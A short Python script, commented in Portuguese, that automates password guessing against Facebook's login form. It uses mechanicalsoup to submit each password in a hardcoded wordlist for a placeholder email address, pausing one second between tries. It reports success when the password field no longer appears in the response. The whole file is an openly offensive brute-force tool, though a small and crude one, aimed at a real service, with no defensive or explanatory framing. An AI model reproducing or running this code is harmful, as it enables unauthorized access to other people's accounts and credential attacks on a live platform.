import mechanicalsoup
import time
from bs4 import BeautifulSoup

URL = "https://www.facebook.com/"

senhas = ["123456","123456789","abcdefgh","oaudhfoudb","uiabduadoucb","uabdcibadc","audfpoadbf","aubdfpuoadbf",
          "adafad","asdafgadga","heyhey"]

def tenta(senha):
    #cria o navegador virtual
    navegador = mechanicalsoup.Browser()

    #Pega o conteudo da pagina do Facebook
    paginalogin = navegador.get(URL)

    #print(paginalogin.headers)

    #Achamos o formulário de login
    login_form = paginalogin.soup.find("form", {"id":"login_form"})

    #vamos encontrar o input do usuário e senha
    login_form.find("input", {"name": "email"})["value"] = "@mail.com"
    login_form.find("input", {"name": "pass"})["value"] = senha

    #submit form
    response = navegador.submit(login_form,paginalogin.url)

    #verificar se deu certo
    ret = response.text.find("name=\"pass\" id=\"pass\"")
    return ret


for senha in senhas:
    ret = tenta(senha)

    if ret == -1:
        print("Usuário/Senha corretos(s)")
    else:
        print("Usuário/Senha errados(s)")
    time.sleep(1)